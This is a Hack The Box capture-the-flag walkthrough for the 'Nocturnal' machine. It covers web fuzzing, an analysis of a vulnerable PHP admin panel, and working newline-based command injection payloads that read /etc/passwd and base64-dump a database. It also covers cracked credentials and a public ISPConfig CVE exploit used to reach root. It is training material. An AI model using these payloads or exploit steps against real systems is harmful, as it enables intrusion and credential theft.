---
sticker: emoji//1f303
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |




# RECONNAISSANCE
---


We need to add `nocturnal.htb` to `/etc/hosts`:

```
echo 'IP nocturnal.htb' | sudo tee -a /etc/hosts
```


We can check the following:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414131950.png)

We can begin fuzzing:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://nocturnal.htb/FUZZ" -ic -c -t 200 -e .php,.html,.xml

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .xml
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.php               [Status: 200, Size: 644, Words: 126, Lines: 22, Duration: 105ms]
index.php               [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 111ms]
register.php            [Status: 200, Size: 649, Words: 126, Lines: 22, Duration: 105ms]
view.php                [Status: 302, Size: 2919, Words: 1167, Lines: 123, Duration: 109ms]
uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 106ms]
uploads.xml             [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 106ms]
uploads.html            [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 106ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 105ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 104ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106ms]
```

Got a few interesting directories, for example, the `view.php` seems weird, if we check it up, we find this:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414133917.png)

It means we need a parameter, let's fuzz for parameters, I will use `arjun` for this, we can install it using:

```
pip3 install arjun
```

```
arjun -u http://nocturnal.htb/view.php
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

[*] Scanning 0/1: http://nocturnal.htb/view.php
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[+] Extracted 2 parameters from response for testing: password, username
[*] Logicforcing the URL endpoint
[!] No parameters were discovered
```

We found some parameters, after fuzzing again, we can find we got a parameter named `file=`, so, we can try fuzzing for usernames based on these two parameters, for this, let's create a test account and upload a simple file, I uploaded a file called `legitimate.pdf` (I did all this before the fuzzing, since I was testing for LFI, we need the cookie in order to fuzz), now, let's fuzz and find some hidden usernames:

```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=htb_shell.php.pdf" -H "Cookie: PHPSESSID=j23pun9jaj6197kcesh6efpoj6" -t 50 -fc 403 -ac -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=htb_shell.php.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 :: Header           : Cookie: PHPSESSID=j23pun9jaj6197kcesh6efpoj6
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 109ms]
123                     [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 118ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 116ms]
administrator           [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 113ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 108ms]
```

We found some users, for example, the `amanda` and `tobias` usernames seems weird, knowing the usernames, we can now check the url again and use the username:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414145432.png)

Still getting the invalid file extension, if we remember them right, we can use any of them:

```
http://nocturnal.htb/view.php?username=amanda&file=.pdf
```

We get this:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414145506.png)

There is a hidden file inside: `privacy.odt`, we can download it:

```
http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

If we get it, we can see this:

```
file privacy.odt
privacy.odt: Zip archive, with extra data prepended
```

In order to extract a `.odt` file, we can use:

```
unzip privacy.odt -d privacy_content
```


We get this:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414145630.png)

If we check content.xml, we can see the following:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414145723.png)

There we go, we got credentials for `amanda`:

```
amanda:arHkG7HAI68X8s1J
```

These credentials only work in the web application, not on ssh, let's proceed with exploitation.





# EXPLOITATION
---


If we log with the credentials we got, we can see this:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414145853.png)


We got a `nocturnal_database.db.pdf` file, we can try checking it first:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414150119.png)

It seems like there's a hidden database, I tried getting it with curl but it does not work, let's proceed to the admin panel:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414150944.png)

We are able to create backups on here, I tried creating a backup to check if the database was in here but it wasn't, an interesting founding I got was when I read the source code for `admin.php`, we can see this:

```php
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #ff8c00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #2c2c2c;
            width: 90%;
            max-width: 1000px;
            padding: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
        }

        h1, h2 {
            color: #ff8c00;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            width: 100%;
            background-color: #333;
            color: #ff8c00;
        }

        button {
            padding: 12px;
            font-size: 16px;
            background-color: #2d72bc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #245a9e;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            background-color: #444;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .file-list li.folder {
            background-color: #3b3b3b;
        }

        .file-list li.file {
            background-color: #4d4d4d;
        }

        .file-list li a {
            color: #ff8c00;
            text-decoration: none;
            margin-left: 10px;
        }

        .file-list li a:hover {
            text-decoration: underline;
        }

        pre {
            background-color: #2d2d2d;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            background-color: #e7f5e6;
            color: #2d7b40;
            font-weight: 500;
        }

        .error {
            background-color: #f8d7da;
            color: #842029;
        }

        .backup-output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #ff8c00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```

There's a critical vulnerability in this code, the `cleanEntry` function filters out dangerous characters (`;`, `&`, `|`, `$`, , `` ` ``, `{`, `}`, `&&`), but **newlines (`\n`)** and **tabs (`\t`)** are allowed. The `$password` is directly inserted into a shell command without proper quoting, enabling command injection via newlines.

After testing some payloads, I was able to exploit the `id` command with the following:

```
password=%0Abash%09-c%09"id"%0A&backup=Create+Backup
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414172644.png)

I tried getting a shell at this point but was unable to do it, it seems the server kind of interpret the input but is unable to get us a shell, let's look around the machine, if we remember correctly, there's a `nocturnal_database.db` file at `/nocturnal_database`, if we check the contents of this directory, we can find this:

```
password=%0Abash%09-c%09"ls%09-la%09/var/www/nocturnal_database"%0A&backup=Create+Backup
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414172837.png)

There it is, we can use `base64` to get the file into our local machine:

```
password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=Create+Backup
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414172949.png)

We need to copy the content of it and do:


```
echo 'BASE64 STRING' | base64 -d > nocturnal_database.db
```

With this, we can now analyze the file using `sqlitebrowser`:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414173043.png)

We see some hashes, we can try using the command injection to check which user has a bash console, since cat is disabled with this, we can try head:

```
password=%0Abash%09-c%09"head%09-n%0950%09/etc/passwd"%0A&backup=Create+Backup
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414173258.png)

Seems like the user we need is `tobias`, let's crack the hash, it is a simple `md5` hash:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414173336.png)


There we go, we finally got credentials:

```
tobias:slowmotionapocalypse
```

We can go to ssh with these:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414173415.png)

Let's go with privilege escalation.


# PRIVILEGE ESCALATION
---

We can read user flag now:

```
tobias@nocturnal:~$ cat user.txt
67ca4e25ada7fa55f2f517f70d543c61
```

We can use `linpeas` to check for any PE vector:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174019.png)

Seems weird, if we keep analyzing the output from linpeas, we can see something called `ispconfig`, since we got another website open, let's use port forwarding to check the contents of it:

```
ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174209.png)

There we go, we are dealing with something called `ISPCONFIG`, we can try checking the version in the source code:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174241.png)

So, `ispconfig 3.2`, let's search for an exploit:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174330.png)

We got `CVE-2023-46818`, let's search an exploit and use it:

```
EXPLOIT: https://github.com/bipbopbup/CVE-2023-46818-python-exploit
```

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174412.png)

Let's get it, we need to do this:

```
python exploit.py http://127.0.0.1:9090 admin slowmotionapocalypse
```

We can see this output:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020250414174551.png)

There we go, we can finally read root shell and finish the CTF.

```
ispconfig-shell# cat /root/root.txt
041ca7b5f944f8bb87433bbfa856beab
```

https://www.hackthebox.com/achievement/machine/1872557/656


